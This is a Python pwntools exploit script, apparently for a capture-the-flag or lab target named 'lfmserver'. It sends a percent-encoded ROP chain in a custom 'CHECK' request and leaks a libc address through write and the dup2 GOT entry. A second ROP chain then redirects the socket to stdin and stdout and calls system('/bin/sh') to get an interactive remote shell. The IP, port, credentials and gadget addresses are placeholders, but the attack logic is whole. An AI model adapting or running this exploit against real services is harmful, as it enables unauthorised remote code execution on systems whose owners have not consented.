from pwn import *
 
def encode(string):
    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)
 
def genrequest(payload):
    request = "{}".format(encode(payload))
    request = "CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n".format(request, username, password, hash)
    return request
 
 
context.arch = ''
#context.log_level = ''
username = ""
password = ""
hash = ""
 
elf = ELF("./lfmserver")
libc=ELF('./libc.so.6')   
 
poprdi = "INSERT POPRID" #pop rdi ; ret
poprsi = "INSERT RSI" #pop rsi ; pop r15 ; ret
rop_nop_ret = INSERT NOP #nop; ret
ropnop = INSERT ROPNOP #ret
write = p64(elf.plt["write"])
fd = 6
 
rop = poprdi + p64(fd) + poprsi + p64(elf.got['dup2']) + p64(0) + ropnop + p64(elf.symbols['write'])
 
p = remote('EXPLOIT IP ADDRESS', PORT)
p.sendline(genrequest(rop))
 
leak = p.recvall().split('\n')
print(leak)
leak=leak[4][1:9]
leak = u64(leak.ljust(NUMBER))
libc.address = leak - libc.symbols['dup2']
log.info("Libc base: " + hex(libc.address))
 
 
 
fd = 7 ##  BETWEEN 3 AND 8
# start our second ROP chain with the rebased libc
rop2 = ROP(libc)
 
# copy fd to STDIN (0), STDOUT (1), STDERR (2)
rop2.dup2(fd,0)
rop2.dup2(fd,1)
rop2.dup2(fd,2)
 
# call system with /bin/sh
rop2.system(next(libc.search('/bin/sh\x00')))
 
# show us what the ROP chain will look like
#log.info("Stage 2 ROP chain:\n" + rop2.dump())
 
# build payload
payload = genrequest(str(rop2))
p = remote('EXPLOIT IP', PORT)
p.sendline(payload)
 
# call receive to see if connection closed
received=p.recv()
 
log.info("received : " + received)
# time to get interactive
p.clean()
p.interactive()
